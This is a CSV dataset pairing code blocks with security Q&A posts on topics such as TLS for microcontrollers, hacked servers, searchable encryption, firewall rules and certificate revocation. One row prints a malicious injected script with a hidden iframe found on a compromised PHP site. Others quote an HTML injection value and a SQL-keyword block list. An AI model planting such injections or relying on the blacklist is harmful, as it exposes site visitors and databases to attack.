,CODE,TEXT,code_token_length,text_token_length,security_terms_count,has_code_construct
21,"Encrypt my communication (C->S & S->C)
Do 2-way authentication (C->S & S->C)
Avoid man-in-middle attacks
","Target hardware is a rather low-powered MCU (ARM Cortex-M3 @72MHz, with just about 64KB SRAM and 256KB flash), so walking the thin line here. My board does have ethernet, and I will eventually get lwIP (lightweight TCP/IP FOSS suite) running on it (currently struggling). However, I also need some kind of super light-weight alternative to SSL/TLS. I am aware of the multiple GPL'd SSL/TLS implementations for such MCU's, but their footprint is still fairly significant. While they do fit-in, given everything else, don't leave much room for others. My traffic is not HTTP, so I don't have to worry about HTTPS, and my client/server communication can be completely proprietary, so non-standard solution is okay. Looking for suggestions on what might be the minimalistic yet robust (well a weak security is worthless), alternative that helps me -- {code-blk} I won't be able to optimize library at ARMv7 assembly level, and thus bank entirely on my programming skills and the GNU-ARM compiler's optimization. Given above, any pointers of what might be the best options ? C: Client, S: Server. My communication is all binary data.",37,287,5,True
24,"- 69.158.XXX.XXX - - [02/May/2011:12:32:18 -0400] ""\x16\x03\x01"" 501 368 ""-"" ""-""
- 69.158.XXX.XXX - - [02/May/2011:12:32:18 -0400] ""\x16\x03\x01"" 501 368 ""-"" ""-""
- 69.158.XXX.XXX - - [02/May/2011:12:32:18 -0400] ""\x16\x03\x01"" 501 368 ""-"" ""-""
- 69.158.XXX.XXX - - [02/May/2011:12:32:18 -0400] ""\x16\x03\x01"" 501 368 ""-"" ""-""
","I recently had a call from BELL concerning a virus on our Linux ( Debian ) Server. Apparently Google emailed our client about an Italian Database found on our server that was doing phishing. They asked Bell to block our IP if we couldn't find it within an hour. The folder was called ""Show"" and inside it was an index.PHP and a bunch of other files. I deleted it and now it's fine. The folder rights were root:root. I believe it was added when the site admin uploaded a file from his PC. But how would the file ownerships be root:root? How do I prevent such problems. Is there any Linux packages that would help? ***In case its relevant the client is using phpMyFaq and the folder ""Show"" was inside the folder ""Attachments"". P.s in my access.log I have a lot of these: {code-blk} where XXX.XXX is a real IP... Could it be related? After Googling these codes I always get something about SSL's.",220,248,1,True
28,"www.google.com uses an invalid security certificate.
The certificate is not trusted because it is self-signed.
(Error code: sec_error_ca_cert_invalid)
","Context: I'm currently working as an expat for my company in a country where the Internet is notably untrustworthy. It made the headlines a few months ago for stealing facebook, twitter and gmail account passwords. There was a revolution back in January and things are supposed to have improved. And indeed they have, since when I connect to the Internet from home using one of the local provider's 3G HSPD connection things are much smoother (but still rough on the edges like systematic 403 messages sometimes => goto reboot the modem). Problem But... There's always a but... When however I connect from the customer's premises then, among other weird things1, no SSL certificate is recognised (my company's sso, gmail...) !!! Whenever I attempt to connect through https, my browser shows a warning page to give me a chance to manually validate the certificate. {code-blk}.  Probably wrong MIME type in the response. NB: I have no Facebook account to start with.",43,230,1,True
34,"ENC_DISPLAY_NAME         | ENC_TABLE_NAME
------------------------ | -----------------
[IV1]{John's table}      | [IV2]{TABLE_3574}
[IV3]{Eric's list}       | [IV4]{TABLE_3100}
                         |
[IV5]{Darren's projects} | [IV6]{TABLE_2823}
[IV7]{Paul's contacts}   | [IV8]{TABLE_5843}

AESKey key = ...;
String str = ""Darren's projects"";
CRCType crc = ComputeCRC(str);

BinaryString enc = crc.ToBinaryString ( ).Concat
    (EncryptWithAESandCBC(str, key, (IVType)crc));

INSERT INTO MY_TABLE(ENC_DISPLAY_NAME,ENC_TABLE_NAME) VALUES(enc, ...);
","[Originally on programmers.stackexchange.com with title: Can you encrypt with AES+CBC and search the encrypted data] Basically, I'm going to go with Advanced Encryption Standard with either Cipher-Block Chaining mode or Cipher Feedback mode or Output Feedback mode (I haven't decided yet). Each mode requires an initialization vector. The thing is that I want to make the encrypted string ""searchable"" like this: Suppose I have a list of database tables together with a ""display name"" for each table. Conceptually the list would look like this (I've used {xxx} to mean the encrypted form of xxx, and [IVx] to mean an initialization vector): {code-blk}. Has this been tried before? Are there any (security) risks? [Related question: ]",243,201,2,True
39,"block in  all # default deny
block out all
pass in  on dc0 from 10.0.0.0/8 to 10.1.1.1
","Can one use ipopts, and in particular IP , to circumvent source-based blocking in pf or iptables? For example, with OpenBSD's pf: {code-blk} Can IP source routing of TCP/IP packets over dc0 be used to circumnavigate (so to speak) the firewall rules and communicate with 10.1.1.1 from a network other than 10/8? Even if possible, is such circumnavigation a viable or plausible attack if dc0 is public-facing? If so, can this be prevented?",28,139,1,True
46,"3   0.597039    Alcatel-_c3:a8:91   Spanning-tree-(for-bridges)_00  STP Conf. Root = 32768/0/00:d0:95:c3:a8:68  Cost = 0  Port = 0x722f
6   1.577752    04:4b:80:80:80:03   Spanning-tree-(for-bridges)_00  STP Conf. TC + Root = 32768/0/06:4b:80:80:80:03  Cost = 0  Port = 0x8000
8   2.599098    Alcatel-_c3:a8:91   Spanning-tree-(for-bridges)_00  STP Conf. Root = 32768/0/00:d0:95:c3:a8:68  Cost = 0  Port = 0x722f
9   2.599133    04:4b:80:80:80:03   Spanning-tree-(for-bridges)_00  STP Topology Change Notification
","I live at a student dorm, where we are connected to a student network. The administrators of this network have forgotten to disable STP broadcast on non-infrastructure ports. Periodically, I lose my network connection, and I decided to see if the STP configuration might be the issue. This the normal packet I receive every second: {code-blk} The Root Bridge System ID is ff:ff:ff:ff:ff:ff. This is while I have no network outage. I've tried to find documentation for what purpose this broadcast hw addr is announced as the root bridge, but no luck...",241,147,2,True
70,"vi /etc/privoxy/user.action

{ +redirect{s@http://@https://@} }
.chrome.google.com
.code.google.com
.docs.google.com
.encrypted.google.com
.googlecode.com
.googlelabs.com
.mail.google.com

# google calendar
{ +redirect{s@http://www.google.com/calendar/@https://www.google.com/calendar/@} }
.google.com

# google notebook
{ +redirect{s@http://www.google.com/notebook/@https://www.google.com/notebook/@} }
.google.com
","So I'm always browsing the web through Privoxy using minimum these rules: {code-blk} This is working great, in short it ensures that if I visit e.x.: a Google Notebook page, it's always using encryption. So if I forget to type ""HTTPS"" and I type ""HTTP"" to a Google notebook URL it redirects me to the HTTPS version of Google Notebook. But... a strange thing happened a few weeks ago several times: when I used the Privoxy I just couldn't reach Gmail.com, or Google Notebook, etc. If I configured Firefox to not use Privoxy I could reach Google Notebook pages, or Gmail, etc. The error message when I used Privoxy was [from the webbrowser]: ""connection timed out"". [I tried to restart Privoxy, restart the machine, and I tried it on other machines with different OS, at different places/ISP's] so the Q: Could that be that I was attacked or there were any problems with Google Notebook, Gmail over CLEANLY* HTTPS? *CLEANLY means that CLEANLY over HTTPS [redirecting all  requests to . I'm using Privoxy because it could defend me from sslsniff like attacks [FIXME] -> so that HTTPS connections could get degraded to HTTP.",199,309,1,True
74,"<script type=""text/javascript"">
        d=new Date();
        d.setDate(d.getDate()+1);
        document.cookie=""PHPSESS1D=1; path=/; expires="" + d.toGMTString();
      </script><style type=""text/css"">#yavvw {width: 10px;height: 10px;frameborder: no;visibility: hidden;scrolling: no;}</style><iframe id=""yavvw"" src=""http://SANITISEDURL.net/ad.jpg?2""></iframe>
","UPDATE: The server was rooted, php.ini was replaced that cause the injection to appear. Still haven't figured out which directive is injecting the javascript. I'm troubleshooting a hacked website where a javascript is injected in every PHP file and only PHP. The injection only show up in IE also. I have experience with injection before but most of them were injected through FTP, and you can see them in the page itself. I'm not seeing any virus or malicious process on the server so far, and beginning to think either the PHP interpreter or Apache was hacked somehow. Has anyone seen this before or know where I should look? The injection is below, {code-blk} This happens to all website on the server, even with PHP file that only has a simple echo. .htaccess looks clean for all of them. Server running PHP 5.2.17 and Apache 2.2.17.",164,214,1,True
81,"[1970-01-01 00:00:00] The system will be restored the factory value.
[1970-01-01 00:00:00] The system current version: 1.0.5.1.
[1970-01-01 00:00:00] The system restart all services.
[1970-01-01 00:00:03] UPnP had been enabled.
[1970-01-01 00:00:03] The IP&MAC bind had been enabled.
[1970-01-01 00:00:03] arpspoof had been enabled.
[1970-01-01 00:00:03] The Telnet service had been enabled
[1970-01-01 00:00:03] WAN Mode is : DHCP.
","Just bought a 3G router from China and then checked the log: {code-blk} This is the router: Is it normal? maybe It  legitimate for configuration purposes? Like the citation bellow: ARP spoofing can also be used for legitimate purposes. For instance, network registration tools may redirect unregistered hosts to a signup page before allowing them full access to the network. This technique is used in hotels and other semi-public networks to allow traveling laptop users to access the Internet through a device known as a head end processor (HEP).[citation needed] ARP spoofing can also be used to implement redundancy of network services. A backup server may use ARP spoofing to take over for a defective server and transparently offer redundancy. In case not, what should I do?",156,185,1,True
88,"* Root CA (offline)
  * Issuing CA
    * Client 1
    * Client 2

* Root CA (CRL distribution point = http://...)
  * Issuing CA (OCSP = http://...)
    * Client 1
    * Client 2

* Root CA
  * Issuing CA (CRL distribution point = http://...)
    * Client 1 (OCSP = http://...)
    * Client 2 (OCSP = http://...)
","Here's an example PKI setup: {code-blk} Basically, I'm confused about who specifies URIs for obtaining revocation information. Is this specified in the CA's certificate, meaning ""I'm the CA, and this is where I'll tell you about certificates I've issued that are no longer valid,"" or is this specified in the client certificate, meaning ""if this certificate gets revoked, here's where you'll find out about it?"" I've looked through RFC 5280 and couldn't find a clear answer to this question. Most examples suggest that the second way is correct, but the first one seems to make more sense to me. Which one is it? If the second way is correct, is there any reason to also specify CRL distribution points in the Root CA?",85,183,1,True
98,"A potentially dangerous Request.QueryString value was detected from the client (lang=""...th: 19

<html>Shazam</html>"").

Description: Request Validation has detected a potentially dangerous client input value, and processing of the request has been aborted. This value may indicate an attempt to compromise the security of your application, such as a cross-site scripting attack. You can disable request validation by setting validateRequest=false in the Page directive or in the configuration section. However, it is strongly recommended that your application explicitly check all inputs in this case. 
",By default ASP.NET checks for HTTP Response Splitting attack when you do Response.Redirect: {code-blk} Is there any other way to perform HTTP Response Splitting attack on default ASP.NET website configuration? What about ASP.NET MVC?,127,60,1,True
99,"blackList={""--"", "";"", ""/*"", ""*/"", ""@@"", ""@"",
                  ""char"", ""nchar"", ""varchar"", ""nvarchar"",
                  ""alter"", ""begin"", ""cast"", ""create"", ""cursor"",
                  ""declare"", ""delete"", ""drop"", ""end"", ""exec"",
                  ""execute"", ""fetch"", ""insert"", ""kill"", ""open"",
                   ""sys"", ""sysobjects"", ""syscolumns"",
                  ""table"", ""update""};
","I have a following problem/challenge: Web application (ASP.NET 3.5) installed on corporate LAN and operates on SQL Server DB needs to provide ability to generate custom reports. These reports can be basically anything from underline DB, include complicated joints, unions and whatever you can think of. (Just selects, no Insert/delete/drop/update) The easiest way to do it – allow to the system to execute SQL queries. System admin will add custom queries to the system and “regular” users will be able to execute them. If they need new query, they will ask Admin to create a query for them and then they will be able to run it by Query ID. White List approach is not going to work here (at least I can’t see how). What about black list? I was thinking about something like that: {code-blk} Once again – the only person that can create such Custom Query is admin (and he most likely has full control over DB in any case). Any help would be welcome. Thanks A",129,238,1,True
